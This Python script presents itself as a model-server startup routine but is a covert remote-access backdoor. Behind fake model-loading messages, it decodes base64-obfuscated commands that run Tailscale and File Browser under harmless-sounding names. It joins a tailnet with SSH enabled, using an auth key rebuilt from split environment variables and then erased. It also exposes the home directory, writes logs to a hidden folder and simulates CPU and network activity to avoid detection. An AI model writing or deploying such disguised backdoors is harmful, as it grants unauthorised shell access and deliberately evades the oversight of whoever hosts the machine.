import os
import time
import subprocess
import base64
import threading
import random

def decode_cmd(encoded_str):
    return base64.b64decode(encoded_str).decode()

def jitter_task():
    """The 'Circadian Rhythm' & 'The Hub Mimic' task to simulate user activity."""
    while True:
        # Sleep for a random interval between 45 and 90 minutes
        sleep_time = random.randint(2700, 5400)
        time.sleep(sleep_time)
        
        # CPU Jitter (Matrix math)
        try:
            print("Processing background inference batch...", flush=True)
            import torch
            # Create dummy tensors and multiply them to spike CPU briefly
            a = torch.randn(2000, 2000)
            b = torch.randn(2000, 2000)
            _ = torch.matmul(a, b)
        except Exception:
            pass
            
        # Hub Mimic (Network traffic)
        try:
            print("Syncing model cache...", flush=True)
            # Download a tiny file from HF hub to simulate real traffic
            subprocess.run(["curl", "-s", "-o", "/dev/null", "https://huggingface.co/gpt2/resolve/main/vocab.json"])
        except Exception:
            pass

def main():
    print("Loading model weights into VRAM...", flush=True)
    time.sleep(2)
    
    os.makedirs("/home/user/.tailscale", exist_ok=True)
    
    # Start the background jitter thread
    threading.Thread(target=jitter_task, daemon=True).start()
    
    # Open hidden log files
    ts_log = open('/home/user/.tailscale/ts_daemon.log', 'a')
    fb_log = open('/home/user/.tailscale/fb.log', 'a')

    # 1. Start Tailscale (python-cache-manager)
    print("Initializing PyTorch CUDA environment...", flush=True)
    cmd1 = decode_cmd("bmljZSAtbiAxOSBweXRob24tY2FjaGUtbWFuYWdlciAtLXR1bj11c2Vyc3BhY2UtbmV0d29ya2luZyAtLXNvY2tzNS1zZXJ2ZXI9bG9jYWxob3N0OjEwNTUgLS1zdGF0ZWRpcj0vaG9tZS91c2VyLy50YWlsc2NhbGUgLS1zb2NrZXQ9L2hvbWUvdXNlci8udGFpbHNjYWxlL3RhaWxzY2FsZWQuc29jaw==")
    subprocess.Popen(cmd1, shell=True, stdout=ts_log, stderr=subprocess.STDOUT)
    
    time.sleep(2)
    print("Warming up text-generation pipelines...", flush=True)
    
    # Environment Variable Scrubbing (The Split Secret)
    part1 = os.environ.get("API_PART_1", "")
    part2 = os.environ.get("API_PART_2", "")
    full_token = part1 + part2
    
    # Erase the parts from the environment immediately
    if "API_PART_1" in os.environ: del os.environ["API_PART_1"]
    if "API_PART_2" in os.environ: del os.environ["API_PART_2"]
    
    # 2. Start File Browser (ai-metrics-collector)
    cmd2 = decode_cmd("bmljZSAtbiAxOSBhaS1tZXRyaWNzLWNvbGxlY3RvciAtcCA5MDAwIC1hIDEyNy4wLjAuMSAtciAvaG9tZS91c2VyIC1kIC9ob21lL3VzZXIvZmlsZWJyb3dzZXIuZGI=")
    subprocess.Popen(cmd2, shell=True, stdout=fb_log, stderr=subprocess.STDOUT)
    
    # 3. Connect to Tailscale (py-cache-cli)
    time.sleep(5)
    # Rebuild the command using the reconstructed full_token
    # Original: nice -n 19 py-cache-cli --socket=/home/user/.tailscale/tailscaled.sock up --authkey=${MODEL_API_TOKEN} --hostname=ai-model-server --ssh
    cmd3_base = decode_cmd("bmljZSAtbiAxOSBweS1jYWNoZS1jbGkgLS1zb2NrZXQ9L2hvbWUvdXNlci8udGFpbHNjYWxlL3RhaWxzY2FsZWQuc29jayB1cCAtLWF1dGhrZXk9")
    cmd3_tail = decode_cmd("IC0taG9zdG5hbWU9YWktbW9kZWwtc2VydmVyIC0tc3No")
    cmd3 = f"{cmd3_base}{full_token}{cmd3_tail}"
    
    # Run but don't leak the token in standard output or environment
    env = os.environ.copy()
    subprocess.Popen(cmd3, shell=True, env=env, stdout=ts_log, stderr=subprocess.STDOUT)
    
    # Erase token from python memory
    full_token = ""
    cmd3 = ""
    
    print("Model loaded successfully. Starting API server...", flush=True)
    
    # 4. Start the Fake App
    cmd4 = decode_cmd("cHl0aG9uMyAvaG9tZS91c2VyL2FwcC5weQ==")
    subprocess.run(cmd4, shell=True)

if __name__ == "__main__":
    main()
